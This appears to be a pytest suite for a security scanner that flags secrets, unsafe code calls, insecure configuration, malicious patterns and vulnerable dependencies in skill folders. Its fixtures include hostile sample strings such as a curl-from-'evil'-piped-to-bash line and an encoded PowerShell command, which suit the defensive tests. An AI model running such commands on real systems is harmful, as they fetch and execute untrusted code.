from __future__ import annotations

from pathlib import Path

from engine import pipeline


def _write(path: Path, text: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")


def _by_rule(findings: list[pipeline.Finding], rule_id: str) -> list[pipeline.Finding]:
    return [f for f in findings if f.rule_id == rule_id]


def test_secrets_detects_private_key_pattern(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(
        tmp_path / "a.pem",
        "-----BEGIN RSA PRIVATE KEY-----\nabc\n-----END RSA PRIVATE KEY-----\n",
    )
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "SEC-PRIVATE-KEY")
    assert matched
    assert matched[0].category == "secrets"


def test_secrets_detects_aws_access_key(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "conf.txt", "aws_access_key_id=AKIA1234567890ABCDEF\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "SEC-AWS-ACCESS-KEY")


def test_secrets_detects_generic_token_assignment(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "settings.py", 'api_key = "supersecret12"\n')
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "SEC-GENERIC-TOKEN")
    assert matched
    assert matched[0].severity == "Medium"


def test_secrets_ignores_too_short_generic_token(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "settings.py", 'token = "short7"\n')
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "SEC-GENERIC-TOKEN") == []


def test_sast_detects_eval_and_exec_calls(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "danger.py", "x = eval(user_input)\nexec(x)\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "SAST-EVAL")
    assert _by_rule(findings, "SAST-EXEC")


def test_sast_detects_subprocess_high_severity(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "run.py", "import subprocess\nsubprocess.run(cmd)\n")
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "SAST-SUBPROCESS")
    assert matched
    assert matched[0].severity == "High"


def test_sast_detects_yaml_load_but_not_safe_load(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(
        tmp_path / "cfg.py",
        "import yaml\nobj = yaml.safe_load(safe)\nobj2 = yaml.load(raw)\n",
    )
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "SAST-YAML-LOAD")
    assert len(matched) == 1


def test_config_detects_debug_on_from_env_file(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / ".env", "DEBUG=true\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "CFG-DEBUG-ON")


def test_config_detects_cors_wildcard(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "config.yaml", "cors: *\n")
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "CFG-CORS-ANY")
    assert matched
    assert matched[0].severity == "Medium"


def test_config_detects_tls_verify_off(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "settings.py", "verify = false\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "CFG-TLS-VERIFY-OFF")


def test_config_does_not_flag_verify_true(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "settings.py", "verify=true\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "CFG-TLS-VERIFY-OFF") == []


def test_malicious_detects_downloader_pipe_to_shell(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "install.sh", "curl https://evil/p.sh | bash\n")
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "MAL-DOWNLOADER")
    assert matched
    assert matched[0].severity == "High"


def test_malicious_detects_powershell_encoded_command(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "x.ps1", "powershell -enc SGVsbG8=\n")
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "MAL-POWERSHELL-ENC")


def test_malicious_detects_long_base64_and_records_length(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "blob.txt", f'payload = "{("A" * 220)}"\n')
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "MAL-BASE64-LONG")
    assert matched
    assert matched[0].severity == "Low"
    assert matched[0].evidence.get("matched_len", 0) >= 200


def test_malicious_ignores_short_base64_like_string(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "blob.txt", 'payload = "QUJDREVGR0g="\n')
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "MAL-BASE64-LONG") == []


def test_dependency_adds_manifest_finding_for_package_json(tmp_path: Path) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "package.json", '{"name":"demo","version":"1.0.0"}\n')
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "DEP-MANIFEST")
    assert matched
    assert matched[0].category == "dependency"


def test_dependency_osv_vuln_from_mocked_response(tmp_path: Path, monkeypatch) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "requirements.txt", "requests==2.19.0\n")

    class _Resp:
        status_code = 200

        @staticmethod
        def json() -> dict:
            return {
                "vulns": [
                    {"id": "PYSEC-TEST-0001", "summary": "demo vuln"},
                ]
            }

    class _Client:
        def __init__(self, timeout: float) -> None:
            self.timeout = timeout

        def post(self, url: str, json: dict) -> _Resp:  # noqa: A002
            assert "api.osv.dev/v1/query" in url
            assert json["package"]["ecosystem"] == "PyPI"
            return _Resp()

        def close(self) -> None:
            return None

    monkeypatch.setattr(pipeline.httpx, "Client", _Client)
    findings = pipeline.scan_directory(tmp_path)
    matched = _by_rule(findings, "DEP-OSV-VULN")
    assert matched
    assert matched[0].evidence.get("vuln_id") == "PYSEC-TEST-0001"


def test_dependency_osv_skips_unpinned_requirements(tmp_path: Path, monkeypatch) -> None:
    _write(tmp_path / "SKILL.md", "# demo\n")
    _write(tmp_path / "requirements.txt", "requests>=2.31.0\n")

    class _Client:
        def __init__(self, timeout: float) -> None:
            self.timeout = timeout
            self.called = False

        def post(self, url: str, json: dict) -> None:  # noqa: A002
            self.called = True
            raise AssertionError("OSV should not be called for unpinned requirement")

        def close(self) -> None:
            return None

    monkeypatch.setattr(pipeline.httpx, "Client", _Client)
    findings = pipeline.scan_directory(tmp_path)
    assert _by_rule(findings, "DEP-OSV-VULN") == []
